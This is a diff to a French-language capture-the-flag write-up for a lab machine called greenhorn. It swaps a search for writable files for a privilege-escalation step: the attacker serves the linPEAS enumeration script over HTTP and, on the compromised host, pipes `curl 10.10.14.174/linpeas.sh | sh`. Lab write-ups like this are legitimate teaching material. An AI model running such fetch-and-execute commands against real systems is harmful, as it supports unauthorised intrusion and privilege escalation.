@@ -353,14 +353,18 @@ drwx------ 2 junior junior  4096 Jun 20 06:36 .cache
 
 Il faudrait donc réussir à se connecter avec l'utilisateur `junior` pour voir le flag.
 
-On regarde les fichiers sur lesquels nous avons des droits d'écriture:
+On va utiliser [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) pour trouver des vulnérabilités pour l'escalation de privilège.
+Pour le transférer sur la machine, on va télécharger le script sur notre machine et le servir:
 ```bash
-www-data@greenhorn:/$ find / -writable -type f 2>/dev/null
-find / -writable -type f 2>/dev/null
-...
-/usr/local/bin/gitea
-...
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+sudo python3 -m http.server 80
 ```
+
+Par la suite, depuis le serveur, on va télécharger `linPEAS`:
+```bash
+curl 10.10.14.174/linpeas.sh | sh
+```
+
 
 On semble pouvoir écrire sur le fichier gitea.
 En examinant les permissions sur le fichier, on dirait que junior a installé gitea mais a mal configuré les permissions:
